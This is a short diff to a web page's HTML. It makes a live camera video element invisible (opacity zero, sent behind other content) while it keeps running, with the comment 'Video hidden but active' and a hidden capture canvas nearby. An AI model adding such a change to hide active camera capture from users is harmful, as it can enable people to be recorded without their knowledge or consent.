@@ -28,7 +28,9 @@
 
         <main>
             <div class="camera-wrapper">
-                <video id="camera-stream" autoplay playsinline muted></video>
+                <!-- Video hidden but active -->
+                <video id="camera-stream" autoplay playsinline muted
+                    style="opacity: 0; position: absolute; pointer-events: none; z-index: -1;"></video>
                 <canvas id="capture-canvas" style="display: none;"></canvas>
             </div>
 
